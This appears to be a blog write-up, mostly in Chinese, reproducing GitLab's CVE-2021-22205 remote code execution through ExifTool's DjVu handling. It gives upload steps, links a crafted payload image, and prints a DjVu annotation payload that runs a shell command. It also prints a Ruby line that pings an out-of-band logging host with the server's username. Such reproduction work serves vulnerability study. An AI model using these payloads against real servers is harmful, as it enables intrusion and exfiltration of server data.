---
layout: about
category: about
Researchname: GitLab CVE-2021-22205 snippet RCE
toc: true
permalink: /about/Gitlab-RCE-with-snippet-function/
author: Bin4xin
desc: 「Gitlab」
---

### 复现

- Create a new snippet
- 登录创建一个仓库，并且创建新的`snippet`
- In the description field, hit `"Attach a file"`; Select and uplaod echo_vakzz.jpg
- [`echo_vakzz.jpg`](https://github.com/Bin4xin/bigger-than-bigger/blob/master/CoVV/Gitlab/CVE-2021-22205/echo_vakzz.jpg){:target="_blank"}上传附件
- See that the file /tmp/vakzz has been created on the server

也可以通过未授权RCE，具体可以查看[(CVE-2021-22205)RCE - 七、手工复现-未授权](https://www.freebuf.com/articles/web/303375.html){:target="_blank"}

> 制作rce图片可直接编辑，修改下面的代码就好；或者上面的文章中
>
> **[六、手工复现-有授权 - 2 DjVu格式图片制作方式]**
>
> 也有相应的制作方法。

```ruby
qx{ping `whoami`.5pxha.i3ntq7.bnslog.top}
```

### 效果

![May-18-2022-11-27-15.gif]({{site.PicturesLinks_Domain}}/images/2022/05/18/May-18-2022-11-27-15.gif)

### 分析

如作者在报告里所说：

- When uploading image files, GitLab Workhorse passes any files with the extensions `[jpg|jpeg|tiff]` through to ExifTool to remove any non-whitelisted tags.
- 上传图像文件时，`GitLab Workhorse` 会将任何扩展名为 `jpg|jpeg|tiff` 的文件传递给 `ExifTool`，以删除任何未列入白名单的标签。

```go
func IsExifFile(filename string) bool {
	filenameMatch := regexp.MustCompile(`(?i)\.(jpg|jpeg|tiff)$`)

	return filenameMatch.MatchString(filename)
}
```

- One of the supported formats is DjVu. When parsing the DjVu annotation, the tokens are evaled to "convert C escape sequences".

```perl
(metadata
	(Copyright "\
" . qx{echo vakzz >/tmp/vakzz} . \
" b ") )
```

### 参考

- [HackerOne - RCE when removing metadata with ExifTool](https://hackerone.com/reports/1154542){:target="_blank"}
- [GitLab 远程命令执行漏洞复现(CVE-2021-22205)](https://www.freebuf.com/articles/web/303375.html){:target="_blank"}